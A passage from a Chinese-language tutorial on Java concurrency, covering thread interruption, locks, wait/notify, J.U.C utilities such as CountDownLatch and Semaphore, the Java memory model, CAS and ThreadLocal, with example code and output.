中启动一个线程之后再中断它，由于线程中调用了 Thread.sleep() 方法，因此会抛出一个 InterruptedException，从而提前结束线程，不执行之后的语句。 1234567891011121314public class InterruptExample &#123; private static class MyThread1 extends Thread &#123; @Override public void run() &#123; try &#123; Thread.sleep(2000); System.out.println(\"Thread run\"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 123456public static void main(String[] args) throws InterruptedException &#123; Thread thread1 = new MyThread1(); thread1.start(); thread1.interrupt(); System.out.println(\"Main run\");&#125; 123456Main runjava.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at InterruptExample.lambda$main$0(InterruptExample.java:5) at InterruptExample$$Lambda$1/713338599.run(Unknown Source) at java.lang.Thread.run(Thread.java:745) 0x4.1interrupted()如果一个线程的 run() 方法执行一个无限循环，并且没有执行 sleep() 等会抛出 InterruptedException 的操作，那么调用线程的 interrupt() 方法就无法使线程提前结束。 但是调用 interrupt() 方法会设置线程的中断标记，此时调用 interrupted() 方法会返回 true。因此可以在循环体中使用 interrupted() 方法来判断线程是否处于中断状态，从而提前结束线程。 123456789101112public class InterruptExample &#123; private static class MyThread2 extends Thread &#123; @Override public void run() &#123; while (!interrupted()) &#123; // .. &#125; System.out.println(\"Thread end\"); &#125; &#125;&#125; 12345public static void main(String[] args) throws InterruptedException &#123; Thread thread2 = new MyThread2(); thread2.start(); thread2.interrupt();&#125; 1Thread end 0x4.2Executor 的中断操作调用 Executor 的 shutdown() 方法会等待线程都执行完毕之后再关闭，但是如果调用的是 shutdownNow() 方法，则相当于调用每个线程的 interrupt() 方法。 以下使用 Lambda 创建线程，相当于创建了一个匿名内部线程。 12345678910111213public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; &#123; try &#123; Thread.sleep(2000); System.out.println(\"Thread run\"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;); executorService.shutdownNow(); System.out.println(\"Main run\");&#125; 12345678Main runjava.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at ExecutorInterruptExample.lambda$main$0(ExecutorInterruptExample.java:9) at ExecutorInterruptExample$$Lambda$1/1160460865.run(Unknown Source) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) 如果只想中断 Executor 中的一个线程，可以通过使用 submit() 方法来提交一个线程，它会返回一个 Future&lt;?&gt; 对象，通过调用该对象的 cancel(true) 方法就可以中断线程。 1234Future&lt;?&gt; future = executorService.submit(() -&gt; &#123; // ..&#125;);future.cancel(true); 0x5互斥同步Java 提供了两种锁机制来控制多个线程对共享资源的互斥访问，第一个是 JVM 实现的 synchronized，而另一个是 JDK 实现的 ReentrantLock。 0x5.1synchronized1. 同步一个代码块 12345public void func() &#123; synchronized (this) &#123; // ... &#125;&#125; 它只作用于同一个对象，如果调用两个对象上的同步代码块，就不会进行同步。 对于以下代码，使用 ExecutorService 执行了两个线程，由于调用的是同一个对象的同步代码块，因此这两个线程会进行同步，当一个线程进入同步语句块时，另一个线程就必须等待。 12345678910public class SynchronizedExample &#123; public void func1() &#123; synchronized (this) &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + \" \"); &#125; &#125; &#125;&#125; 123456public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func1()); executorService.execute(() -&gt; e1.func1());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 对于以下代码，两个线程调用了不同对象的同步代码块，因此这两个线程就不需要同步。从输出结果可以看出，两个线程交叉执行。 1234567public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func1()); executorService.execute(() -&gt; e2.func1());&#125; 10 0 1 1 2 2 3 3 4 4 5 5 6 6 7 7 8 8 9 9 2. 同步一个方法 123public synchronized void func () &#123; // ...&#125; 它和同步代码块一样，作用于同一个对象。 3. 同步一个类 12345public void func() &#123; synchronized (SynchronizedExample.class) &#123; // ... &#125;&#125; 作用于整个类，也就是说两个线程调用同一个类的不同对象上的这种同步语句，也会进行同步。 12345678910public class SynchronizedExample &#123; public void func2() &#123; synchronized (SynchronizedExample.class) &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + \" \"); &#125; &#125; &#125;&#125; 1234567public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func2()); executorService.execute(() -&gt; e2.func2());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 4. 同步一个静态方法 123public synchronized static void fun() &#123; // ...&#125; 作用于整个类。 0x5.2ReentrantLockReentrantLock 是 java.util.concurrent（J.U.C）包中的锁。 123456789101112131415public class LockExample &#123; private Lock lock = new ReentrantLock(); public void func() &#123; lock.lock(); try &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + \" \"); &#125; &#125; finally &#123; lock.unlock(); // 确保释放锁，从而避免发生死锁。 &#125; &#125;&#125; 123456public static void main(String[] args) &#123; LockExample lockExample = new LockExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; lockExample.func()); executorService.execute(() -&gt; lockExample.func());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0x5.3比较1. 锁的实现 synchronized 是 JVM 实现的，而 ReentrantLock 是 JDK 实现的。 2. 性能 新版本 Java 对 synchronized 进行了很多优化，例如自旋锁等，synchronized 与 ReentrantLock 大致相同。 3. 等待可中断 当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情。 ReentrantLock 可中断，而 synchronized 不行。 4. 公平锁 公平锁是指多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁。 synchronized 中的锁是非公平的，ReentrantLock 默认情况下也是非公平的，但是也可以是公平的。 5. 锁绑定多个条件 一个 ReentrantLock 可以同时绑定多个 Condition 对象。 0x5.4使用选择 除非需要使用 ReentrantLock 的高级功能，否则优先使用 synchronized。这是因为 synchronized 是 JVM 实现的一种锁机制，JVM 原生地支持它，而 ReentrantLock 不是所有的 JDK 版本都支持。并且使用 synchronized 不用担心没有释放锁而导致死锁问题，因为 JVM 会确保锁的释放。 0x6线程之间的协作当多个线程可以一起工作去解决某个问题时，如果某些部分必须在其它部分之前完成，那么就需要对线程进行协调。 0x6.1join()在线程中调用另一个线程的 join() 方法，会将当前线程挂起，而不是忙等待，直到目标线程结束。 对于以下代码，虽然 b 线程先启动，但是因为在 b 线程中调用了 a 线程的 join() 方法，b 线程会等待 a 线程结束才继续执行，因此最后能够保证 a 线程的输出先于 b 线程的输出。 1234567891011121314151617181920212223242526272829303132333435public class JoinExample &#123; private class A extends Thread &#123; @Override public void run() &#123; System.out.println(\"A\"); &#125; &#125; private class B extends Thread &#123; private A a; B(A a) &#123; this.a = a; &#125; @Override public void run() &#123; try &#123; a.join(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(\"B\"); &#125; &#125; public void test() &#123; A a = new A(); B b = new B(a); b.start(); a.start(); &#125;&#125; 1234public static void main(String[] args) &#123; JoinExample example = new JoinExample(); example.test();&#125; 12AB 0x6.2wait() notify() notifyAll()调用 wait() 使得线程等待某个条件满足，线程在等待时会被挂起，当其他线程的运行使得这个条件满足时，其它线程会调用 notify() 或者 notifyAll() 来唤醒挂起的线程。 它们都属于 Object 的一部分，而不属于 Thread。 只能用在同步方法或者同步控制块中使用，否则会在运行时抛出 IllegalMonitorStateException。 使用 wait() 挂起期间，线程会释放锁。这是因为，如果没有释放锁，那么其它线程就无法进入对象的同步方法或者同步控制块中，那么就无法执行 notify() 或者 notifyAll() 来唤醒挂起的线程，造成死锁。 12345678910111213141516public class WaitNotifyExample &#123; public synchronized void before() &#123; System.out.println(\"before\"); notifyAll(); &#125; public synchronized void after() &#123; try &#123; wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(\"after\"); &#125;&#125; 123456public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); WaitNotifyExample example = new WaitNotifyExample(); executorService.execute(() -&gt; example.after()); executorService.execute(() -&gt; example.before());&#125; 12beforeafter wait() 和 sleep() 的区别 wait() 是 Object 的方法，而 sleep() 是 Thread 的静态方法； wait() 会释放锁，sleep() 不会。 0x6.3await() signal() signalAll()java.util.concurrent 类库中提供了 Condition 类来实现线程之间的协调，可以在 Condition 上调用 await() 方法使线程等待，其它线程调用 signal() 或 signalAll() 方法唤醒等待的线程。 相比于 wait() 这种等待方式，await() 可以指定等待的条件，因此更加灵活。 使用 Lock 来获取一个 Condition 对象。 123456789101112131415161718192021222324252627public class AwaitSignalExample &#123; private Lock lock = new ReentrantLock(); private Condition condition = lock.newCondition(); public void before() &#123; lock.lock(); try &#123; System.out.println(\"before\"); condition.signalAll(); &#125; finally &#123; lock.unlock(); &#125; &#125; public void after() &#123; lock.lock(); try &#123; condition.await(); System.out.println(\"after\"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; lock.unlock(); &#125; &#125;&#125; 123456public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); AwaitSignalExample example = new AwaitSignalExample(); executorService.execute(() -&gt; example.after()); executorService.execute(() -&gt; example.before());&#125; 12beforeafter 0x7J.U.C - AQSjava.util.concurrent（J.U.C）大大提高了并发性能，AQS 被认为是 J.U.C 的核心。 0x7.1CountDownLatch用来控制一个线程等待多个线程。 维护了一个计数器 cnt，每次调用 countDown() 方法会让计数器的值减 1，减到 0 的时候，那些因为调用 await() 方法而在等待的线程就会被唤醒。 1234567891011121314151617public class CountdownLatchExample &#123; public static void main(String[] args) throws InterruptedException &#123; final int totalThread = 10; CountDownLatch countDownLatch = new CountDownLatch(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalThread; i++) &#123; executorService.execute(() -&gt; &#123; System.out.print(\"run..\"); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); System.out.println(\"end\"); executorService.shutdown(); &#125;&#125; 1run..run..run..run..run..run..run..run..run..run..end 0x7.2CyclicBarrier用来控制多个线程互相等待，只有当多个线程都到达时，这些线程才会继续执行。 和 CountdownLatch 相似，都是通过维护计数器来实现的。线程执行 await() 方法之后计数器会减 1，并进行等待，直到计数器为 0，所有调用 await() 方法而在等待的线程才能继续执行。 CyclicBarrier 和 CountdownLatch 的一个区别是，CyclicBarrier 的计数器通过调用 reset() 方法可以循环使用，所以它才叫做循环屏障。 CyclicBarrier 有两个构造函数，其中 parties 指示计数器的初始值，barrierAction 在所有线程都到达屏障的时候会执行一次。 12345678910public CyclicBarrier(int parties, Runnable barrierAction) &#123; if (parties &lt;= 0) throw new IllegalArgumentException(); this.parties = parties; this.count = parties; this.barrierCommand = barrierAction;&#125;public CyclicBarrier(int parties) &#123; this(parties, null);&#125; 1234567891011121314151617181920public class CyclicBarrierExample &#123; public static void main(String[] args) &#123; final int totalThread = 10; CyclicBarrier cyclicBarrier = new CyclicBarrier(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalThread; i++) &#123; executorService.execute(() -&gt; &#123; System.out.print(\"before..\"); try &#123; cyclicBarrier.await(); &#125; catch (InterruptedException | BrokenBarrierException e) &#123; e.printStackTrace(); &#125; System.out.print(\"after..\"); &#125;); &#125; executorService.shutdown(); &#125;&#125; 1before..before..before..before..before..before..before..before..before..before..after..after..after..after..after..after..after..after..after..after.. 0x7.3SemaphoreSemaphore 类似于操作系统中的信号量，可以控制对互斥资源的访问线程数。 以下代码模拟了对某个服务的并发请求，每次只能有 3 个客户端同时访问，请求总数为 10。 12345678910111213141516171819202122public class SemaphoreExample &#123; public static void main(String[] args) &#123; final int clientCount = 3; final int totalRequestCount = 10; Semaphore semaphore = new Semaphore(clientCount); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalRequestCount; i++) &#123; executorService.execute(()-&gt;&#123; try &#123; semaphore.acquire(); System.out.print(semaphore.availablePermits() + \" \"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; semaphore.release(); &#125; &#125;); &#125; executorService.shutdown(); &#125;&#125; 12 1 2 2 2 2 2 1 2 2 0x8J.U.C - 其它组件0x8.1FutureTask在介绍 Callable 时我们知道它可以有返回值，返回值通过 Future 进行封装。FutureTask 实现了 RunnableFuture 接口，该接口继承自 Runnable 和 Future 接口，这使得 FutureTask 既可以当做一个任务执行，也可以有返回值。 1public class FutureTask&lt;V&gt; implements RunnableFuture&lt;V&gt; 1public interface RunnableFuture&lt;V&gt; extends Runnable, Future&lt;V&gt; FutureTask 可用于异步获取执行结果或取消执行任务的场景。当一个计算任务需要执行很长时间，那么就可以用 FutureTask 来封装这个任务，主线程在完成自己的任务之后再去获取结果。 123456789101112131415161718192021222324252627282930public class FutureTaskExample &#123; public static void main(String[] args) throws ExecutionException, InterruptedException &#123; FutureTask&lt;Integer&gt; futureTask = new FutureTask&lt;Integer&gt;(new Callable&lt;Integer&gt;() &#123; @Override public Integer call() throws Exception &#123; int result = 0; for (int i = 0; i &lt; 100; i++) &#123; Thread.sleep(10); result += i; &#125; return result; &#125; &#125;); Thread computeThread = new Thread(futureTask); computeThread.start(); Thread otherThread = new Thread(() -&gt; &#123; System.out.println(\"other task is running...\"); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;); otherThread.start(); System.out.println(futureTask.get()); &#125;&#125; 12other task is running...4950 0x8.2BlockingQueuejava.util.concurrent.BlockingQueue 接口有以下阻塞队列的实现： FIFO 队列 ：LinkedBlockingQueue、ArrayBlockingQueue（固定长度） 优先级队列 ：PriorityBlockingQueue 提供了阻塞的 take() 和 put() 方法：如果队列为空 take() 将阻塞，直到队列中有内容；如果队列为满 put() 将阻塞，直到队列有空闲位置。 使用 BlockingQueue 实现生产者消费者问题 1234567891011121314151617181920212223242526272829public class ProducerConsumer &#123; private static BlockingQueue&lt;String&gt; queue = new ArrayBlockingQueue&lt;&gt;(5); private static class Producer extends Thread &#123; @Override public void run() &#123; try &#123; queue.put(\"product\"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.print(\"produce..\"); &#125; &#125; private static class Consumer extends Thread &#123; @Override public void run() &#123; try &#123; String product = queue.take(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.print(\"consume..\"); &#125; &#125;&#125; 1234567891011121314public static void main(String[] args) &#123; for (int i = 0; i &lt; 2; i++) &#123; Producer producer = new Producer(); producer.start(); &#125; for (int i = 0; i &lt; 5; i++) &#123; Consumer consumer = new Consumer(); consumer.start(); &#125; for (int i = 0; i &lt; 3; i++) &#123; Producer producer = new Producer(); producer.start(); &#125;&#125; 1produce..produce..consume..consume..produce..consume..produce..consume..produce..consume.. 0x8.3ForkJoin主要用于并行计算中，和 MapReduce 原理类似，都是把大的计算任务拆分成多个小任务并行计算。 12345678910111213141516171819202122232425262728293031public class ForkJoinExample extends RecursiveTask&lt;Integer&gt; &#123; private final int threshold = 5; private int first; private int last; public ForkJoinExample(int first, int last) &#123; this.first = first; this.last = last; &#125; @Override protected Integer compute() &#123; int result = 0; if (last - first &lt;= threshold) &#123; // 任务足够小则直接计算 for (int i = first; i &lt;= last; i++) &#123; result += i; &#125; &#125; else &#123; // 拆分成小任务 int middle = first + (last - first) / 2; ForkJoinExample leftTask = new ForkJoinExample(first, middle); ForkJoinExample rightTask = new ForkJoinExample(middle + 1, last); leftTask.fork(); rightTask.fork(); result = leftTask.join() + rightTask.join(); &#125; return result; &#125;&#125; 123456public static void main(String[] args) throws ExecutionException, InterruptedException &#123; ForkJoinExample example = new ForkJoinExample(1, 10000); ForkJoinPool forkJoinPool = new ForkJoinPool(); Future result = forkJoinPool.submit(example); System.out.println(result.get());&#125; ForkJoin 使用 ForkJoinPool 来启动，它是一个特殊的线程池，线程数量取决于 CPU 核数。 1public class ForkJoinPool extends AbstractExecutorService ForkJoinPool 实现了工作窃取算法来提高 CPU 的利用率。每个线程都维护了一个双端队列，用来存储需要执行的任务。工作窃取算法允许空闲的线程从其它线程的双端队列中窃取一个任务来执行。窃取的任务必须是最晚的任务，避免和队列所属线程发生竞争。例如下图中，Thread2 从 Thread1 的队列中拿出最晚的 Task1 任务，Thread1 会拿出 Task2 来执行，这样就避免发生竞争。但是如果队列中只有一个任务时还是会发生竞争。 0x9线程不安全示例如果多个线程对同一个共享数据进行访问而不采取同步操作的话，那么操作的结果是不一致的。 以下代码演示了 1000 个线程同时对 cnt 执行自增操作，操作结束之后它的值有可能小于 1000。 123456789101112public class ThreadUnsafeExample &#123; private int cnt = 0; public void add() &#123; cnt++; &#125; public int get() &#123; return cnt; &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; ThreadUnsafeExample example = new ThreadUnsafeExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 1997 0x10Java 内存模型Java 内存模型试图屏蔽各种硬件和操作系统的内存访问差异，以实现让 Java 程序在各种平台下都能达到一致的内存访问效果。 0x10.1主内存与工作内存处理器上的寄存器的读写的速度比内存快几个数量级，为了解决这种速度矛盾，在它们之间加入了高速缓存。 加入高速缓存带来了一个新的问题：缓存一致性。如果多个缓存共享同一块主内存区域，那么多个缓存的数据可能会不一致，需要一些协议来解决这个问题。 所有的变量都存储在主内存中，每个线程还有自己的工作内存，工作内存存储在高速缓存或者寄存器中，保存了该线程使用的变量的主内存副本拷贝。 线程只能直接操作工作内存中的变量，不同线程之间的变量值传递需要通过主内存来完成。 0x10.2内存间交互操作Java 内存模型定义了 8 个操作来完成主内存和工作内存的交互操作。 read：把一个变量的值从主内存传输到工作内存中 load：在 read 之后执行，把 read 得到的值放入工作内存的变量副本中 use：把工作内存中一个变量的值传递给执行引擎 assign：把一个从执行引擎接收到的值赋给工作内存的变量 store：把工作内存的一个变量的值传送到主内存中 write：在 store 之后执行，把 store 得到的值放入主内存的变量中 lock：作用于主内存的变量 unlock 0x10.3内存模型三大特性0x10.3.1. 原子性 Java 内存模型保证了 read、load、use、assign、store、write、lock 和 unlock 操作具有原子性，例如对一个 int 类型的变量执行 assign 赋值操作，这个操作就是原子性的。但是 Java 内存模型允许虚拟机将没有被 volatile 修饰的 64 位数据（long，double）的读写操作划分为两次 32 位的操作来进行，即 load、store、read 和 write 操作可以不具备原子性。 有一个错误认识就是，int 等原子性的类型在多线程环境中不会出现线程安全问题。前面的线程不安全示例代码中，cnt 属于 int 类型变量，1000 个线程对它进行自增操作之后，得到的值为 997 而不是 1000。 为了方便讨论，将内存间的交互操作简化为 3 个：load、assign、store。 下图演示了两个线程同时对 cnt 进行操作，load、assign、store 这一系列操作整体上看不具备原子性，那么在 T1 修改 cnt 并且还没有将修改后的值写入主内存，T2 依然可以读入旧值。可以看出，这两个线程虽然执行了两次自增运算，但是主内存中 cnt 的值最后为 1 而不是 2。因此对 int 类型读写操作满足原子性只是说明 load、assign、store 这些单个操作具备原子性。 AtomicInteger 能保证多个线程修改的原子性。 使用 AtomicInteger 重写之前线程不安全的代码之后得到以下线程安全实现： 1234567891011public class AtomicExample &#123; private AtomicInteger cnt = new AtomicInteger(); public void add() &#123; cnt.incrementAndGet(); &#125; public int get() &#123; return cnt.get(); &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; AtomicExample example = new AtomicExample(); // 只修改这条语句 final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 11000 除了使用原子类之外，也可以使用 synchronized 互斥锁来保证操作的原子性。它对应的内存间交互操作为：lock 和 unlock，在虚拟机实现上对应的字节码指令为 monitorenter 和 monitorexit。 1234567891011public class AtomicSynchronizedExample &#123; private int cnt = 0; public synchronized void add() &#123; cnt++; &#125; public synchronized int get() &#123; return cnt; &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; AtomicSynchronizedExample example = new AtomicSynchronizedExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 11000 0x10.3.2. 可见性 可见性指当一个线程修改了共享变量的值，其它线程能够立即得知这个修改。Java 内存模型是通过在变量修改后将新值同步回主内存，在变量读取前从主内存刷新变量值来实现可见性的。 主要有三种实现可见性的方式： volatile synchronized，对一个变量执行 unlock 操作之前，必须把变量值同步回主内存。 final，被 final 关键字修饰的字段在构造器中一旦初始化完成，并且没有发生 this 逃逸（其它线程通过 this 引用访问到初始化了一半的对象），那么其它线程就能看见 final 字段的值。 对前面的线程不安全示例中的 cnt 变量使用 volatile 修饰，不能解决线程不安全问题，因为 volatile 并不能保证操作的原子性。 0x10.3.3. 有序性 有序性是指：在本线程内观察，所有操作都是有序的。在一个线程观察另一个线程，所有操作都是无序的，无序是因为发生了指令重排序。在 Java 内存模型中，允许编译器和处理器对指令进行重排序，重排序过程不会影响到单线程程序的执行，却会影响到多线程并发执行的正确性。 volatile 关键字通过添加内存屏障的方式来禁止指令重排，即重排序时不能把后面的指令放到内存屏障之前。 也可以通过 synchronized 来保证有序性，它保证每个时刻只有一个线程执行同步代码，相当于是让线程顺序执行同步代码。 0x10.4先行发生原则 上面提到了可以用 volatile 和 synchronized 来保证有序性。除此之外，JVM 还规定了先行发生原则，让一个操作无需控制就能先于另一个操作完成。 0x10.4.1. 单一线程原则 Single Thread rule 在一个线程内，在程序前面的操作先行发生于后面的操作。 0x10.4.2. 管程锁定规则 Monitor Lock Rule 一个 unlock 操作先行发生于后面对同一个锁的 lock 操作。 0x10.4.3. volatile 变量规则 Volatile Variable Rule 对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作。 0x10.3.4. 线程启动规则 Thread Start Rule Thread 对象的 start() 方法调用先行发生于此线程的每一个动作。 0x10.3.5. 线程加入规则 Thread Join Rule Thread 对象的结束先行发生于 join() 方法返回。 0x10.3.6. 线程中断规则 Thread Interruption Rule 对线程 interrupt() 方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过 interrupted() 方法检测到是否有中断发生。 0x10.3.7. 对象终结规则 Finalizer Rule 一个对象的初始化完成（构造函数执行结束）先行发生于它的 finalize() 方法的开始。 0x10.3.8. 传递性 Transitivity 如果操作 A 先行发生于操作 B，操作 B 先行发生于操作 C，那么操作 A 先行发生于操作 C。 0x11线程安全多个线程不管以何种方式访问某个类，并且在主调代码中不需要进行同步，都能表现正确的行为。 线程安全有以下几种实现方式： 0x11.1不可变不可变（Immutable）的对象一定是线程安全的，不需要再采取任何的线程安全保障措施。只要一个不可变的对象被正确地构建出来，永远也不会看到它在多个线程之中处于不一致的状态。多线程环境下，应当尽量使对象成为不可变，来满足线程安全。 不可变的类型： final 关键字修饰的基本数据类型 String 枚举类型 Number 部分子类，如 Long 和 Double 等数值包装类型，BigInteger 和 BigDecimal 等大数据类型。但同为 Number 的原子类 AtomicInteger 和 AtomicLong 则是可变的。 对于集合类型，可以使用 Collections.unmodifiableXXX() 方法来获取一个不可变的集合。 1234567public class ImmutableExample &#123; public static void main(String[] args) &#123; Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); Map&lt;String, Integer&gt; unmodifiableMap = Collections.unmodifiableMap(map); unmodifiableMap.put(\"a\", 1); &#125;&#125; 123Exception in thread \"main\" java.lang.UnsupportedOperationException at java.util.Collections$UnmodifiableMap.put(Collections.java:1457) at ImmutableExample.main(ImmutableExample.java:9) Collections.unmodifiableXXX() 先对原始的集合进行拷贝，需要对集合进行修改的方法都直接抛出异常。 123public V put(K key, V value) &#123; throw new UnsupportedOperationException();&#125; 0x11.2互斥同步synchronized 和 ReentrantLock。 0x11.3非阻塞同步互斥同步最主要的问题就是线程阻塞和唤醒所带来的性能问题，因此这种同步也称为阻塞同步。 互斥同步属于一种悲观的并发策略，总是认为只要不去做正确的同步措施，那就肯定会出现问题。无论共享数据是否真的会出现竞争，它都要进行加锁（这里讨论的是概念模型，实际上虚拟机会优化掉很大一部分不必要的加锁）、用户态核心态转换、维护锁计数器和检查是否有被阻塞的线程需要唤醒等操作。 0x11.3.1. CAS 随着硬件指令集的发展，我们可以使用基于冲突检测的乐观并发策略：先进行操作，如果没有其它线程争用共享数据，那操作就成功了，否则采取补偿措施（不断地重试，直到成功为止）。这种乐观的并发策略的许多实现都不需要将线程阻塞，因此这种同步操作称为非阻塞同步。 乐观锁需要操作和冲突检测这两个步骤具备原子性，这里就不能再使用互斥同步来保证了，只能靠硬件来完成。硬件支持的原子性操作最典型的是：比较并交换（Compare-and-Swap，CAS）。CAS 指令需要有 3 个操作数，分别是内存地址 V、旧的预期值 A 和新值 B。当执行操作时，只有当 V 的值等于 A，才将 V 的值更新为 B。 0x11.3.2. AtomicInteger J.U.C 包里面的整数原子类 AtomicInteger 的方法调用了 Unsafe 类的 CAS 操作。 以下代码使用了 AtomicInteger 执行了自增的操作。 12345private AtomicInteger cnt = new AtomicInteger();public void add() &#123; cnt.incrementAndGet();&#125; 以下代码是 incrementAndGet() 的源码，它调用了 Unsafe 的 getAndAddInt() 。 123public final int incrementAndGet() &#123; return unsafe.getAndAddInt(this, valueOffset, 1) + 1;&#125; 以下代码是 getAndAddInt() 源码，var1 指示对象内存地址，var2 指示该字段相对对象内存地址的偏移，var4 指示操作需要加的数值，这里为 1。通过 getIntVolatile(var1, var2) 得到旧的预期值，通过调用 compareAndSwapInt() 来进行 CAS 比较，如果该字段内存地址中的值等于 var5，那么就更新内存地址为 var1+var2 的变量为 var5+var4。 可以看到 getAndAddInt() 在一个循环中进行，发生冲突的做法是不断的进行重试。 12345678public final int getAndAddInt(Object var1, long var2, int var4) &#123; int var5; do &#123; var5 = this.getIntVolatile(var1, var2); &#125; while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4)); return var5;&#125; 0x11.3.3. ABA 如果一个变量初次读取的时候是 A 值，它的值被改成了 B，后来又被改回为 A，那 CAS 操作就会误认为它从来没有被改变过。 J.U.C 包提供了一个带有标记的原子引用类 AtomicStampedReference 来解决这个问题，它可以通过控制变量值的版本来保证 CAS 的正确性。大部分情况下 ABA 问题不会影响程序并发的正确性，如果需要解决 ABA 问题，改用传统的互斥同步可能会比原子类更高效。 0x11.4.无同步方案要保证线程安全，并不是一定就要进行同步。如果一个方法本来就不涉及共享数据，那它自然就无须任何同步措施去保证正确性。 0x11.4.1. 栈封闭 多个线程访问同一个方法的局部变量时，不会出现线程安全问题，因为局部变量存储在虚拟机栈中，属于线程私有的。 123456789public class StackClosedExample &#123; public void add100() &#123; int cnt = 0; for (int i = 0; i &lt; 100; i++) &#123; cnt++; &#125; System.out.println(cnt); &#125;&#125; 1234567public static void main(String[] args) &#123; StackClosedExample example = new StackClosedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; example.add100()); executorService.execute(() -&gt; example.add100()); executorService.shutdown();&#125; 12100100 0x11.4.2. 线程本地存储（Thread Local Storage） 如果一段代码中所需要的数据必须与其他代码共享，那就看看这些共享数据的代码是否能保证在同一个线程中执行。如果能保证，我们就可以把共享数据的可见范围限制在同一个线程之内，这样，无须同步也能保证线程之间不出现数据争用的问题。 符合这种特点的应用并不少见，大部分使用消费队列的架构模式（如“生产者-消费者”模式）都会将产品的消费过程尽量在一个线程中消费完。其中最重要的一个应用实例就是经典 Web 交互模型中的“一个请求对应一个服务器线程”（Thread-per-Request）的处理方式，这种处理方式的广泛应用使得很多 Web 服务端应用都可以使用线程本地存储来解决线程安全问题。 可以使用 java.lang.ThreadLocal 类来实现线程本地存储功能。 对于以下代码，thread1 中设置 threadLocal 为 1，而 thread2 设置 threadLocal 为 2。过了一段时间之后，thread1 读取 threadLocal 依然是 1，不受 thread2 的影响。 123456789101112131415161718192021public class ThreadLocalExample &#123; public static void main(String[] args) &#123; ThreadLocal threadLocal = new ThreadLocal(); Thread thread1 = new Thread(() -&gt; &#123; threadLocal.set(1); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(threadLocal.get()); threadLocal.remove(); &#125;); Thread thread2 = new Thread(() -&gt; &#123; threadLocal.set(2); threadLocal.remove(); &#125;); thread1.start(); thread2.start(); &#125;&#125; 11 为了理解 ThreadLocal，先看以下代码： 12345678910111213141516public class ThreadLocalExample1 &#123; public static void main(String[] args) &#123; ThreadLocal threadLocal1 = new ThreadLocal(); ThreadLocal threadLocal2 = new ThreadLocal(); Thread thread1 = new Thread(() -&gt; &#123; threadLocal1.set(1); threadLocal2.set(1); &#125;); Thread thread2 